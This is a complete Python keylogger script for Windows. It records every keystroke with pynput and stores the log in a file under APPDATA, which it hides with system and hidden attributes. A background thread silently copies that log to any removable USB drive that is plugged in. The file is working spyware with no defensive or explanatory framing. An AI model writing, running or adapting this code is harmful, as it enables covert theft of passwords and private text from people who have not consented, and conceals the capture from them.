import os
import time
import shutil
import threading
from pynput.keyboard import Key, Listener
from datetime import datetime
import psutil

log_file = "keylog.txt"
hidden_path = os.path.join(os.getenv("APPDATA"), log_file)
keys = []

def write_to_file():
    global keys
    if keys:
        with open(hidden_path, "a") as f:
            for key in keys:
                f.write(str(key) + " ")
        keys = []

def on_press(key):
    global keys
    try:
        keys.append(key.char)
    except AttributeError:
        if key == Key.space:
            keys.append(" ")
        elif key == Key.enter:
            keys.append("\n")
        elif key == Key.tab:
            keys.append("\t")
        else:
            keys.append(f"[{str(key)}]")

    if len(keys) > 50:
        write_to_file()

def check_usb():
    while True:
        drives = [d.mountpoint for d in psutil.disk_partitions() if 'removable' in d.opts]
        if drives:
            for drive in drives:
                try:
                    shutil.copy2(hidden_path, os.path.join(drive, log_file))
                except Exception:
                    pass
        time.sleep(5)

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def hide_file():
    if os.path.exists(hidden_path):
        os.system(f"attrib +h +s {hidden_path}")

if __name__ == "__main__":
    if not os.path.exists(hidden_path):
        with open(hidden_path, "w") as f:
            f.write(f"Log started at {datetime.now()}\n")

    hide_file()

    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    usb_thread = threading.Thread(target=check_usb)
    usb_thread.daemon = True
    usb_thread.start()

    while True:
        time.sleep(10)
        write_to_file()
